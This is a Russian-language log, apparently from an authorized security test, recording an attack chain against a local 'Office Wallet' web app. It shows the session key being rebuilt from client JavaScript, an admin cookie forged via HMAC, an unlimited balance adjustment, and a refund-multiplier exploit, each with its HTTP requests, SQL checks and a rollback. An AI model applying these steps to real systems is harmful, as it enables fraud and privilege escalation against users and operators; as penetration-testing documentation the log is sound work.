@@ -1,0 +1,62 @@
+OFFICE WALLET · ЦЕПОЧКА АТАКИ
+################################################################################################
+# Ц-3
+################################################################################################
+== Ц-3 · Роль из куки → деньги из воздуха ==
+    · Та же поддельная admin-кука проходит в /accounting/adjust (IsAccountant) —
+    · прямое начисление без ограничений суммы. Второй шаг — возврат qty=100
+    · (OW-05) под обычной учёткой: refund = цена заказа × 100.
+    → GET /static/wallet.js (кусок ключа)
+    ← HTTP 200 /* Office Wallet client */ window.OfficeWallet = {   keyParts: ["office", "-", "wallet"],   tipLimitRub: 50,   sessionKey() {     const tail = window.__SK_TAIL__ || "";     return this.keyParts.join("") + tail;   },   formatRub(kop) {     c...
+    → GET /static/legacy-sync.js (хвост ключа)
+    ← HTTP 200 /* Legacy supply sync helpers */ (function () {   window.SupplySync = {     pathParts: ["api", "v2", "supply", "pricing"],     endpoint() {       return "/" + this.pathParts.join("/");     },     async resolveChannel() {       const r = awa...
+    → SQL SELECT id FROM users WHERE login='adminw'
+    ← psql 6
+    HMAC-SHA256(office-wallet-session-key, '6:admin') = c59d80997f788119de7c0e28…
+    → SQL SELECT balance_kop FROM users WHERE login='petrova';
+    ← psql 957300
+    → POST /accounting/adjust  delta_rub=1000 (кука admin)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT balance_kop FROM users WHERE login='petrova';
+    ← psql 1057300
+    → SQL UPDATE users SET balance_kop=957300 WHERE login='petrova'
+    ← psql UPDATE 1
+    → SQL DELETE FROM operations WHERE kind='adjust' AND memo='цепочка Ц-3'
+    ← psql DELETE 1
+    откат начисления: petrova 957300 коп, строка adjust удалена
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL DELETE FROM cart_items WHERE user_id=1
+    ← psql DELETE 0
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 198936300
+    → POST /cart/add  product_id=1 (товар за 450₽)
+    ← HTTP 302 redirect=http://localhost:18081/cart  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Корзина · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → POST /checkout/quote  item_comment=цепочка Ц-3
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Подтверждение оплаты · Office Wallet</title>   <link rel="preconnect" href="https://fonts.goog...
+    → POST /checkout/confirm  quote_id=165
+    ← HTTP 302 redirect=http://localhost:18081/orders/232  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT total_kop FROM orders WHERE id=232
+    ← psql 45000
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 198891300
+    → POST /orders/232/return  qty=100 (refund = total × 100)
+    ← HTTP 302 redirect=http://localhost:18081/orders/232  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 203391300
+    ┌─ АРТЕФАКТ · Ц-3 · начисление и возврат-умножитель проведены
+    │ adjust: petrova balance_kop 957300 → 1057300 (+100000 коп, роль из куки)
+    │ заказ #232 total=45000 коп; возврат qty=100: ivanov 198891300 → 203391300 (+4500000 коп)
+    └─
+    → SQL DELETE FROM operations WHERE memo='Заказ #232' OR memo='Возврат заказа #232'
+    ← psql DELETE 2
+    → SQL DELETE FROM orders WHERE id=232
+    ← psql DELETE 1
+    → SQL DELETE FROM checkout_quotes WHERE item_comment='цепочка Ц-3'
+    ← psql DELETE 1
+    → SQL DELETE FROM cart_items WHERE user_id=1
+    ← psql DELETE 0
+    → SQL UPDATE users SET balance_kop=198936300 WHERE login='ivanov'
+    ← psql UPDATE 1
+    откат заказа: баланс 198936300, заказ/котировка/корзина удалены
+[+] два шага подтверждены: +1000₽ из куки и ×100 через возврат
